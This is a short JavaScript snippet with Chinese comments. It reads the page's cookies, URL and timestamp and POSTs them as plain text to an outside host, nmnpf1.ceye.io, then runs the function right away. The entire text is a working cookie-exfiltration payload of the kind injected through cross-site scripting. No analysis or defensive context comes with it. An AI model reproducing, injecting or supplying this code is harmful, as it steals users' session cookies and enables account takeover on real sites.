function collectAndSendCookies() {
    // 获取cookie并格式化为简单文本
    const allCookies = document.cookie;
    const data = `Cookies: ${allCookies}\nURL: ${window.location.href}\nTime: ${new Date().toString()}`;
    
    // 使用fetch发送纯文本数据
    fetch(`https://nmnpf1.ceye.io/`, {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain'  // 发送纯文本
        },
        body: data
    });
}

// 执行函数
collectAndSendCookies();
